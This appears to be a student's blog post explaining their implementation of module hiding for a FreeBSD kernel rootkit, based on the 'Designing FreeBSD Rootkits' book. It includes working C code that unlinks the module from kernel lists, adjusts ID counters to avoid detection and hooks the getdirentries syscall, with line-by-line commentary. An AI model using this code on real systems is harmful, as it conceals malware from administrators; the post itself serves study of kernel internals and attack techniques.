Here's the code for this part:
```C
/*
    * These are the vars we will need to hide this module from the kernel
    * itself. They are not defined in any of our headers, so we need
    * to set up some references here so we can actually modify them.
*/
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module)    link; // Chain together all modules
    TAILQ_ENTRY(module)    flink; // All modules in a file.
    struct linker_file     *file; // file which contains this module
    int 		       refs; // Reference  count
    int 		       id; // Unique id number
    char 		       *name; // Module name
    modeventhand_t	       handler; // Event handler
    void		       *arg;
    modspecific_t	       data; // Module specific data.
};

// Function called at load/unload
static int load (struct module *module, int cmd, void *arg) {

    int err = 0;

    if (cmd ==  MOD_LOAD) {
        struct linker_file *lf;
        struct module *mod;

        mtx_lock(&Giant);
        sx_xlock(&kld_sx);

        // Decrease curr kernels ref count by 1
        (&linker_files)-&gt;tqh_first-&gt;refs--;

        /*
            * Go thru linker_files list. If we find ours, remove it
            * from the list and decrement next_file_id.
        */

        TAILQ_FOREACH(lf, &linker_files, link) {
            if (strncmp(lf-&gt;filename, VERSION, LENGTH) == 0) {
                nextid--;
                TAILQ_REMOVE(&linker_files, lf, link);
                break;
            }
        }

        sx_xunlock(&kld_sx);
        mtx_unlock(&Giant);

        sx_xlock(&modules_sx);

        TAILQ_FOREACH(mod, &modules, link) {
            if (strcmp(mod-&gt;name, "hider") == 0) {
                nextid--;
                TAILQ_REMOVE(&modules, mod, link);
                break;
            }
        }

        sx_xunlock(&modules_sx);

        sysent[SYS_getdirentries].sy_call = (sy_call_t *)dir_hook;
    } else if (MOD_UNLOAD) {
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
    } else {
        err = EOPNOTSUPP;
    }

    return (err);
}
```

I know a lot of this is laid out in the *Desingning FreeBSD Rootkits* book. The thing is, it doesn&rsquo;t really explain much, it just gives the code after describing all the relevant stuff. This section&rsquo;s going to be showing I actually put the work in to understand what was going on, as I describe what each line does, how it&rsquo;s relevant and how it works.

Firstly, extern: The variables we declares right at the start of the program are mostly extern. This is because these variables all exist in the files we are #including, but none of them are made directly available through the header files themselves &ndash; they just exist in the source c files. What this means is that we know they&rsquo;re there, but we just need to make them available to ourselves.

This is where extern comes in. This is telling our program not to define any mem space for these variables, meaning that it instead will rely on the linker to find them for us. This means that they will end up referencing the vars we import through our #includes, even though there are no prototypes for them in the relevant header files themselves which we are #including. This is also why you never see the code actually explicitly define the variables.

Now, onto implementing the module hiding:

We can basically look at removing our module from the linker_files list and modules lsit as two instances of nearly identical processes. Here&rsquo;s how I worked through it:

## For linker_files:

* * *

Before we make any modifications to the linker_files list, we need to make sure we place the lock.

The textbook says to use Giant lock and kdm lock. However, this might have changed since the version of FreeBSD the textbook discusses, so I&rsquo;m first going to take a look at the source code to just see what they use.

![](https://www.openlearning.com/u/callumjones/blog/SaHidingARootkitFromKernelMyImplementationAndReflection/Picture16.png?action=download)

So, it looks like now &ldquo;linker_files&rdquo; is protected by an sx lock, so we just have to account for that in our code. We change the line *mtx_lock(&kld_mtx); *to *sx_lock(&kld_sx);* This should account for the updates to the OS.

We know from the notes I wrote that each linker_file struct stores how many other objects are referencing it (the *refs* component). We also know that the first entry in the list of linker_files is always the kernel. Because our rootkit is a module, it will be referencing the kernel, so we now need to reduce that by one.

We also know that the list is a TAILQ data type. Looking at these docs ([https://man7.org/linux/man-pages/man3/tailq.3.html](https://man7.org/linux/man-pages/man3/tailq.3.html)) we know that to reference the first in the list, we simply need to refer to tailq_first.

Now we need to actually look through the list for the name of our KLD (for me that&rsquo;s just hook.ko). Having found it with a simple strcmp, we can then remove it from the TAILQ using the TAILQ_REMOVE() macro (again, see the docs)

Looking in kern_linker.c, we can also see that there is a counter associated with the linker_files. This seems to track the next available ID for a module that is loaded in. It would be a giveaway if this number suddenly skipped one, so we need to decrease it by one when we remove our module&rsquo;s linker_file struct from the TAILQ as well.

![](https://www.openlearning.com/u/callumjones/blog/SaHidingARootkitFromKernelMyImplementationAndReflection/Picture17.png?action=download)

Searching for this in the rest of the file, we can see that it does indeed increment each time we load a module into the linker_files TAILQ.

Now we quickly need to unlock the locks we placed on this function.

Having done this, we&rsquo;ve hidden our module&rsquo;s linker_file information. Now we need to move on to the modules list.

## For Modules

* * *

Now we do more or less the same with the modules list. This section's pretty short because it's all more or less identical (see code at top of post_

The main difference is that in this case, we&rsquo;re using sx_xlock(). Otherwise, we follow the same process for the actual list modification, and then remember to unlock the object again at the end of the sequence.

Then after all this we obviously need to keep our function hook in place (as this is all happening in the load module event handler function.) This code is being prepended to that.

Interestingly, handling MOD_UNLOAD is useless at this point - the kernel literally doesn't know the module's there, so it cannot ever unload it. (Lots of restarts here I come.)

## My Reflections on This Part

* * *

Much easier than the function hooking to be honest. I think it&rsquo;s because I took what I learnt there and applied it here. So firstly, I was much quicker to check through the actual source code to see how much had changed since the version of FreeBSD used in the book. This was the case for sx_xlock &ndash; I knew to look to check the book, I knew where to look and I knew how to look.<span><span><span> </span></span></span>I picked up on this one before it even became a problem in my code. The textbook mentioned it had changed once before, so I thought it would be good to pre-emptively check (and it was.)

Another interesting thing was my linker_file_t variable. It wasn't recognised, with the make giving an error. I spent a while looking through the linker_file.c to see if struct names had changed, but they hadn't. In the end, I discovered that in C, you cannot declare a variable inside a switch statement, which even after 3 years of working in it I didn't know.

I also had the error that Sx_xlock was undefined. This was another easy fix, as looking at the man page, we see that we need an additional include - #include &lt;sys/sx.h&gt;. I think my experience debugging past parts of this project made me much more profficient at this debugging.

Overall, this part was much easier than the nightmare that was function hooking, but I still learnt a tonne and am super happy with the result!